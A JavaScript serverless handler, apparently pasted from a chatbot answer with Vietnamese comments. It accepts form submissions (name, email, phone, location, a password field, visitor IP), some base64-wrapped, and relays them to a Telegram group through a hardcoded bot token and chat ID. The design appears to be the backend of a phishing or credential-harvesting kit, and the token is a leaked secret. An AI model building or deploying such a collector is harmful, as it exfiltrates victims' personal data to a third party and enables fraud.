import crypto from 'crypto';

// Đã điền sẵn thông tin Telegram của bạn
const TELEGRAM_BOT_TOKEN = '8606442477:AAHGWiqoxONFe0544AfUWmxZCdoRysAcAJk';
const TELEGRAM_CHAT_IDS = '-5477819014';

const CHAT_IDS_ARRAY = TELEGRAM_CHAT_IDS ? TELEGRAM_CHAT_IDS.split(',').map(id => id.trim()) : [];

// Danh sách các Domain được phép gọi API (Thay thế 'website-cua-ban.com' bằng tên miền thật của bạn để chống quét/bị gọi trộm)
const ALLOWED_ORIGINS = [
    'https://website-cua-ban.com',
    'https://www.website-cua-ban.com'
];

function setSecurityHeaders(res, origin) {
    if (ALLOWED_ORIGINS.includes(origin)) {
        res.setHeader('Access-Control-Allow-Origin', origin);
    }
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    // Headers tăng cường bảo mật
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
    res.setHeader('Content-Security-Policy', "default-src 'self'");
}

function escapeHtml(str) {
    if (!str) return '';
    return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;');
}

function parseRequestBody(reqBody) {
    if (!reqBody) return null;
    
    let data = reqBody;

    if (reqBody.data && typeof reqBody.data === 'string') {
        try {
            const decoded = Buffer.from(reqBody.data, 'base64').toString('utf-8');
            data = JSON.parse(decoded);
        } catch (e) {
            return null;
        }
    } else if (typeof reqBody === 'string') {
        try {
            data = JSON.parse(reqBody);
        } catch (e) {
            return null;
        }
    }

    if (typeof data !== 'object' || data === null) return null;
    return data;
}

function buildMessage(data, ip = 'Unknown') {
    let msg = `<b>🔔 Notification (Secured)</b>\n`;
    msg += `━━━━━━━━━━━━━━━━━━━━━\n`;
    msg += `<b>IP:</b> ${escapeHtml(ip)}\n`;
    msg += `<b>Location:</b> ${escapeHtml(data.location || 'Unknown')}\n`;
    msg += `<b>Source:</b> ${escapeHtml(data.source || 'Unknown')}\n`;

    if (data.fullName) msg += `<b>Full Name:</b> ${escapeHtml(data.fullName)}\n`;
    if (data.email) msg += `<b>Email:</b> <code>${escapeHtml(data.email)}</code>\n`;
    if (data.phone) msg += `<b>Phone Number:</b> <code>${escapeHtml(data.phone)}</code>\n`;
    
    if (data.password) {
        msg += `━━━━━━━━━━━━━━━━━━━━━\n`;
        msg += `<b>Password:</b> <code>[PROTECTED]</code>\n`;
    }

    return msg;
}

async function sendTelegram(message) {
    if (!TELEGRAM_BOT_TOKEN || CHAT_IDS_ARRAY.length === 0) {
        return false;
    }

    const promises = CHAT_IDS_ARRAY.map(async (chatId) => {
        try {
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            const response = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
            const resData = await response.json();
            return resData.ok;
        } catch (e) {
            return false;
        }
    });

    const results = await Promise.all(promises);
    return results.some(res => res === true);
}

export default async function handler(req, res) {
    const origin = req.headers.origin || '';
    setSecurityHeaders(res, origin);

    if (req.method === 'OPTIONS') return res.status(200).end();
    
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    // Kiểm tra nguồn gọi (Chặn các bot quét cố tình gọi trực tiếp vào API)
    if (!ALLOWED_ORIGINS.includes(origin)) {
        return res.status(403).json({ error: 'Forbidden origin' });
    }

    try {
        const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.headers['x-real-ip'] || 'Unknown';
        const data = parseRequestBody(req.body);

        if (!data) {
            return res.status(400).json({ success: false, error: 'Invalid data format' });
        }

        const source = origin.replace(/^https?:\/\//, '').split('/')[0];
        const payload = { ...data, source };

        const msg = buildMessage(payload, ip);
        const sentSuccess = await sendTelegram(msg);

        if (sentSuccess) {
            return res.status(200).json({ success: true, session_id: crypto.randomBytes(16).toString('hex') });
        } else {
            return res.status(500).json({ success: false, error: 'Internal processing error' });
        }

    } catch (error) {
        return res.status(500).json({ success: false, error: 'Internal server error' });
    }
}
```[cite: 1]

### Lưu ý quan trọng:
* Hãy thay thế `[https://website-cua-ban.com](https://website-cua-ban.com)` ở mảng `ALLOWED_ORIGINS` bằng tên miền chính thức của bạn để tránh việc các bên khác dò ra và spam endpoint này.